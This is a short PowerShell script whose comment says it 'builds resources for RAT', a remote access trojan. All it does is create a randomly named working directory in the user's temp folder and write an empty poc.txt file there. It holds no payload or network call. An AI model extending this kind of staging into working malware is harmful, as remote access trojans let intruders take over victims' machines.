#builds resources for RAT
# created by petros

#random string for directory
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}



##  variables
$wd = random_text
$path = "$env:temp/$wd"
echo $path

# go to temp, make working directory

mkdir $path
cd $path
echo "" > poc.txt
cd c:\Users\petros\Downloads